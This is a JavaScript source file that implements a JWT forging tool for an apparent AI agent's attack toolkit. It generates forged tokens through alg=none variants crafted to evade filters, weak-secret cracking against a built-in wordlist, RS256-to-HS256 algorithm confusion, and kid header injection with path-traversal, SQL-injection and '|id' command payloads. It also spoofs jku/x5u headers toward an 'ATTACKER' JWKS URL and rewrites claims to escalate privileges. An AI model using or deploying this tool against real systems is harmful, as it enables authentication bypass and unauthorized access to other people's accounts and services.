// JWT forging / auth-bypass primitive — pure synchronous algorithm, no network,
// no Chrome, no sockets. Given an original JWT it emits candidate forged tokens
// for the classic attack families (alg=none, weak HS256 secret, RS256->HS256 alg
// confusion, kid header injection, jku/x5u JWKS spoofing) optionally with payload
// claim mutations (privilege escalation like role=admin / sub=0).
//
// WHY: profile_raw_request / profile_race_request give the agent attack primitives
// over the wire; this gives the agent the *token* primitive purely offline so it
// can construct candidates locally and then replay them with the existing request
// tools to see if the target accepts them.
//
// BOUNDARY: it only constructs candidate tokens plus objective notes about how each
// was built. Whether the target accepts a token, whether a signature actually
// validates server-side, or whether privilege was escalated is NEVER decided here —
// the agent replays each candidate against the target and classifies the result.
import crypto from "node:crypto";

// base64url <-> JSON helpers. Node's "base64url" encoding already maps +/ to -_
// and strips padding on encode and tolerates missing padding on decode, so we lean
// on it directly rather than hand-rolling the +/-_ swap and = trimming.
function b64urlEncode(buf) {
  return Buffer.from(buf).toString("base64url");
}
function b64urlDecodeToString(seg) {
  return Buffer.from(String(seg || ""), "base64url").toString("utf8");
}
function encodeJson(obj) {
  return b64urlEncode(Buffer.from(JSON.stringify(obj), "utf8"));
}

// Default tiny wordlist of secrets seen in CTF / misconfigured deployments. Kept
// small on purpose — this is a fast offline probe, not a brute-forcer. The agent
// can pass a larger secretWordlist when it wants more coverage.
const DEFAULT_SECRET_WORDLIST = [
  "secret",
  "password",
  "123456",
  "changeme",
  "jwt",
  "key",
  "admin",
  "test",
  "secretkey",
  "your-256-bit-secret",
  "supersecret",
  "default",
];

const ALL_ATTACKS = [
  "none",
  "weak-secret",
  "hs-confusion",
  "kid-injection",
  "jku-spoof",
  "x5u-spoof",
];

// HS256 over "<headerB64>.<payloadB64>" -> base64url signature segment.
function hmacSha256(signingInput, secret) {
  return crypto.createHmac("sha256", secret).update(signingInput).digest("base64url");
}

// Build a complete JWT string from a header object + payload object + signature
// segment (signature may be "" for unsigned variants like alg=none).
function assembleToken(headerObj, payloadObj, signatureSeg) {
  const h = encodeJson(headerObj);
  const p = encodeJson(payloadObj);
  return `${h}.${p}.${signatureSeg}`;
}

export function forgeJwt(params = {}) {
  const token = String(params?.token || "").trim();
  if (!token) throw new Error("token is required");
  const parts = token.split(".");
  if (parts.length < 2) throw new Error("token must have at least header.payload segments");
  const [origHeaderB64, origPayloadB64, origSigB64 = ""] = parts;

  let header;
  let payload;
  try {
    header = JSON.parse(b64urlDecodeToString(origHeaderB64));
  } catch (e) {
    throw new Error(`failed to decode JWT header: ${e.message}`);
  }
  try {
    payload = JSON.parse(b64urlDecodeToString(origPayloadB64));
  } catch (e) {
    throw new Error(`failed to decode JWT payload: ${e.message}`);
  }
  if (header == null || typeof header !== "object") throw new Error("JWT header is not a JSON object");
  if (payload == null || typeof payload !== "object") throw new Error("JWT payload is not a JSON object");

  const origAlg = header.alg != null ? String(header.alg) : null;
  const origKid = header.kid;

  const mutations = (params?.mutations && typeof params.mutations === "object") ? params.mutations : {};
  // shallow-merge claim mutations into a copy of the payload (overrides existing claims)
  const mutatedPayload = { ...payload, ...mutations };
  const mutationsApplied = Object.keys(mutations);

  const attacks = Array.isArray(params?.attacks) && params.attacks.length > 0
    ? params.attacks.filter((a) => ALL_ATTACKS.includes(a))
    : ALL_ATTACKS.slice();

  const publicKeyPem = params?.publicKeyPem != null ? String(params.publicKeyPem) : null;
  const secretWordlist = Array.isArray(params?.secretWordlist) && params.secretWordlist.length > 0
    ? params.secretWordlist.map((s) => String(s))
    : DEFAULT_SECRET_WORDLIST.slice();
  const attackerJku = params?.attackerJku != null ? String(params.attackerJku) : null;

  const variants = [];

  for (const attack of attacks) {
    if (attack === "none") {
      // alg=none: signature segment is empty, payload carries the (mutated) claims.
      // JWT libraries that honour alg=none accept an unsigned token. Emit lower/title/
      // upper case spellings because filters often blocklist only the exact "none".
      for (const spelling of ["none", "None", "NONE"]) {
        const h = { ...header, alg: spelling };
        variants.push({
          attack: "none",
          token: assembleToken(h, mutatedPayload, ""),
          header: h,
          notes: `alg set to "${spelling}", signature segment left empty (header.payload.). Original alg was ${origAlg}.`,
        });
      }
    } else if (attack === "weak-secret") {
      // Verify the ORIGINAL signature against each candidate secret using the
      // literal original header.payload segments (re-encoding could reorder keys and
      // break the byte match). On a hit, re-sign the MUTATED payload with that secret.
      const origSigningInput = `${origHeaderB64}.${origPayloadB64}`;
      let hit = null;
      if (origSigB64) {
        for (const secret of secretWordlist) {
          if (hmacSha256(origSigningInput, secret) === origSigB64) { hit = secret; break; }
        }
      }
      if (hit !== null) {
        const h = { ...header, alg: "HS256" };
        const signingInput = `${encodeJson(h)}.${encodeJson(mutatedPayload)}`;
        variants.push({
          attack: "weak-secret",
          token: `${signingInput}.${hmacSha256(signingInput, hit)}`,
          header: h,
          notes: `original HS256 signature cracked: secret="${hit}" (from wordlist of ${secretWordlist.length}). Mutated payload re-signed with this secret.`,
        });
      } else {
        // No crack. Still emit one candidate signed with the first wordlist entry so
        // the agent has something to throw if the server's real secret matches it.
        const firstSecret = secretWordlist[0];
        const h = { ...header, alg: "HS256" };
        const signingInput = `${encodeJson(h)}.${encodeJson(mutatedPayload)}`;
        variants.push({
          attack: "weak-secret",
          token: `${signingInput}.${hmacSha256(signingInput, firstSecret)}`,
          header: h,
          notes: `no match in wordlist(${secretWordlist.length})${origSigB64 ? "" : " (original token had no signature segment to verify against)"}. Emitting a candidate signed with first wordlist entry "${firstSecret}".`,
        });
      }
    } else if (attack === "hs-confusion") {
      // RS256/ES256 -> HS256 algorithm confusion: a server that trusts the alg field
      // and uses one key-loading routine will verify an HS256 token using the RSA
      // PUBLIC key bytes as the HMAC secret. We need that public key PEM to build it.
      if (publicKeyPem) {
        const h = { ...header, alg: "HS256" };
        const signingInput = `${encodeJson(h)}.${encodeJson(mutatedPayload)}`;
        variants.push({
          attack: "hs-confusion",
          token: `${signingInput}.${hmacSha256(signingInput, publicKeyPem)}`,
          header: h,
          notes: `RS256->HS256 alg confusion: alg set to HS256, signed with the provided publicKeyPem string used as the HMAC secret. Original alg was ${origAlg}.`,
        });
      } else {
        variants.push({
          attack: "hs-confusion",
          token: null,
          header: null,
          notes: "skipped: publicKeyPem required. Provide the RSA/EC public key PEM (the key the target verifies RS256/ES256 with) to build the HS256 alg-confusion candidate.",
        });
      }
    } else if (attack === "kid-injection") {
      // kid (key id) is fed by some servers into a file path, SQL lookup, or shell —
      // inject a path-traversal, an SQLi, and a command payload, one variant each. The
      // signature is left as the original (or empty if unsigned); exploitation comes
      // from how the server resolves kid, so the agent observes server behaviour.
      const kidPayloads = [
        { label: "path-traversal", kid: "../../../../dev/null" },
        { label: "sqli", kid: "' OR '1'='1' -- " },
        { label: "command", kid: "|id" },
      ];
      for (const kp of kidPayloads) {
        const h = { ...header, kid: kp.kid };
        variants.push({
          attack: "kid-injection",
          token: assembleToken(h, mutatedPayload, origSigB64),
          header: h,
          notes: `kid header set to ${kp.label} payload ${JSON.stringify(kp.kid)}; ${origSigB64 ? "original signature segment kept" : "signature segment empty"}. Original kid was ${JSON.stringify(origKid)}.`,
        });
      }
    } else if (attack === "jku-spoof" || attack === "x5u-spoof") {
      // jku / x5u point the verifier at a JWKS / cert URL. If the server fetches keys
      // from an attacker-controlled URL it will verify against attacker keys. We just
      // swap the header field to the attacker URL (or a placeholder if none given);
      // the agent hosts the JWKS and replays to see if the URL is honoured.
      const field = attack === "jku-spoof" ? "jku" : "x5u";
      const url = attackerJku || "https://ATTACKER/.well-known/jwks.json";
      const h = { ...header, [field]: url };
      variants.push({
        attack,
        token: assembleToken(h, mutatedPayload, origSigB64),
        header: h,
        notes: `${field} header set to ${JSON.stringify(url)}${attackerJku ? "" : " (placeholder — pass attackerJku for a real URL)"}; ${origSigB64 ? "original signature segment kept" : "signature segment empty"}. Host a JWKS/cert at this URL and re-sign to fully weaponise.`,
      });
    }
  }

  return {
    schema: "agent-browser-runtime.jwt-forge.v1",
    original: {
      header,
      payload,
      alg: origAlg,
      signaturePresent: Boolean(origSigB64),
    },
    mutationsApplied,
    variants,
    boundary: "JWT 伪造原语,只输出构造好的候选 token + 客观构造说明。token 是否被目标接受、是否成功提权,由 agent 重放目标判定——NOT a vulnerability judgment。",
  };
}
